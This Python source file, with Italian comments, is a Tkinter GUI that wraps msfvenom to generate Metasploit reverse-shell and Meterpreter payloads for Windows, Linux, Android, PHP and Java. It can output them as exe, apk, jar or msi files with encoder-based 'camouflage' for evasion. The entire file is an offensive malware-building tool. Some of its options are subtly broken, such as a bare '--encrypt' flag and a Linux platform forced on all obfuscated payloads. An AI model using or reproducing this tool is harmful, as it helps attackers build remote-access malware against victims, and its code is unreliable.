import tkinter as tk
from tkinter import filedialog, messagebox
import subprocess
import os

# Funzione per generare il payload con msfvenom
def generate_payload(payload_name, extension, port, host, platform, camuflage):
    # Costruzione del comando msfvenom
    payload_command = f"msfvenom -p {platform} LHOST={host} LPORT={port} -f {extension} -o {payload_name}.{extension}"

    if camuflage == 'Esatto':
        payload_command += " --encrypt"
    elif camuflage == 'Offuscato':
        payload_command += " --platform linux --encoder x86/shikata_ga_nai"

    try:
        # Esegui il comando
        subprocess.run(payload_command, shell=True, check=True)
        messagebox.showinfo("Successo", f"Payload generato con successo! Nome file: {payload_name}.{extension}")
    except subprocess.CalledProcessError as e:
        messagebox.showerror("Errore", f"Si è verificato un errore durante la generazione del payload: {e}")

# Funzione per raccogliere i dati inseriti
def create_payload():
    payload_name = entry_name.get()
    extension = combo_extension.get()
    port = entry_port.get()
    host = entry_host.get()
    platform = combo_platform.get()
    camuflage = combo_camuflage.get()

    # Verifica che i dati siano stati inseriti correttamente
    if not payload_name or not port or not host or not platform:
        messagebox.showwarning("Dati mancanti", "Per favore, riempi tutti i campi obbligatori.")
        return

    # Chiamata alla funzione per generare il payload
    generate_payload(payload_name, extension, port, host, platform, camuflage)

# Interfaccia grafica con Tkinter
root = tk.Tk()
root.title("Generatore di Payload")
root.geometry("500x400")

# Etichetta
label = tk.Label(root, text="Genera un Payload", font=("Arial", 14))
label.pack(pady=10)

# Nome del payload
label_name = tk.Label(root, text="Nome del Payload:")
label_name.pack()
entry_name = tk.Entry(root, width=40)
entry_name.pack(pady=5)

# Estensione del file
label_extension = tk.Label(root, text="Estensione del file:")
label_extension.pack()
combo_extension = tk.StringVar(root)
combo_extension.set("exe")  # Preimpostato su .exe
extension_options = ["exe", "elf", "apk", "jar", "msi"]
extension_menu = tk.OptionMenu(root, combo_extension, *extension_options)
extension_menu.pack(pady=5)

# Porta
label_port = tk.Label(root, text="Porta: 4444 ")
label_port.pack()
entry_port = tk.Entry(root, width=40)
entry_port.pack(pady=5)

# Host
label_host = tk.Label(root, text="Host (IP del server): ")
label_host.pack()
entry_host = tk.Entry(root, width=40)
entry_host.pack(pady=5)

# Payload
label_platform = tk.Label(root, text="Piattaforma:")
label_platform.pack()
combo_platform = tk.StringVar(root)
combo_platform.set("windows/meterpreter/reverse_http")  # Preimpostato su Windows
platform_options = [
    "windows/meterpreter/reverse_http",
    "linux/x86/shell_reverse_tcp",
    "android/meterpreter/reverse_tcp",
    "php/meterpreter_reverse_tcp",
    "java/meterpreter_reverse_tcp",
    "linux/x64/meterpreter_reverse_http"
]
platform_menu = tk.OptionMenu(root, combo_platform, *platform_options)
platform_menu.pack(pady=5)

# Camuffamento
label_camuflage = tk.Label(root, text="Camuffamento:")
label_camuflage.pack()
combo_camuflage = tk.StringVar(root)
combo_camuflage.set("Nessuno")
camuflage_options = ["Nessuno", "Esatto", "Offuscato"]
camuflage_menu = tk.OptionMenu(root, combo_camuflage, *camuflage_options)
camuflage_menu.pack(pady=5)

# Bottone per generare il payload
generate_button = tk.Button(root, text="Genera Payload", command=create_payload)
generate_button.pack(pady=20)

# Avvio dell'interfaccia grafica
root.mainloop()
